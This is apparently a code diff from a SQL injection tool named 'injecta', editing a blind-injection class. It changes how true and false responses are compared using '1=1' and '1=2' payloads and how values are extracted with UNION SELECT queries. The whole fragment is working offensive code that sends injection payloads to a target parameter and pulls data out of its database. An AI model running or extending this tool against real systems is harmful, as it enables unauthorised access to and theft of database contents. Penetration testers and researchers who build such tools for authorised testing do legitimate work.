@@ -71,24 +71,19 @@ class BlindOptimizer:
         _, resp_text, _ = self.req.test_raw(url, condition, param)
         if not resp_text:
             return False
-        bl = self.info.get("_baseline", {})
-        bl_text = bl.get("text", "")
-        if not bl_text:
+        # Compare with AND 1=2 version of same condition
+        false_cond = condition.replace("1=1", "1=2").replace("'1'='1", "'1'='2")
+        if false_cond == condition:
+            return True
+        _, false_text, _ = self.req.test_raw(url, false_cond, param)
+        if not false_text:
             return len(resp_text) > 0
-        diff = abs(len(resp_text) - len(bl_text))
-        return diff > 5 and diff > len(bl_text) * 0.03
+        diff = abs(len(resp_text) - len(false_text))
+        return diff > 5 and diff > len(false_text) * 0.03
 
     def extract_value(self, url: str, param: str, query: str) -> Optional[str]:
-        for q in [
-            f"SELECT ({query})",
-            f"SELECT ({query}) FROM DUAL" if self.dbms == "oracle" else f"SELECT ({query})",
-        ]:
-            payload = f"' UNION {q}-- -"
-            _, resp_text, _ = self.req.test_raw(url, payload, param)
-            if resp_text:
-                match = re.search(r"(\w[\w\s\-.,;:@#$%^&*()]+)", resp_text)
-                if match:
-                    v = match.group(1).strip()
-                    if v and len(v) < 200:
-                        return v
-        return None
+        cols = self.info.get("column_count", 1) if self.info else 1
+        pos = self.info.get("data_pos", 1) if self.info else 1
+        from injecta.enum.extract import extract_clean, MARKER
+        results = extract_clean(self.req, url, param, query, cols, pos)
+        return results[0] if results else None
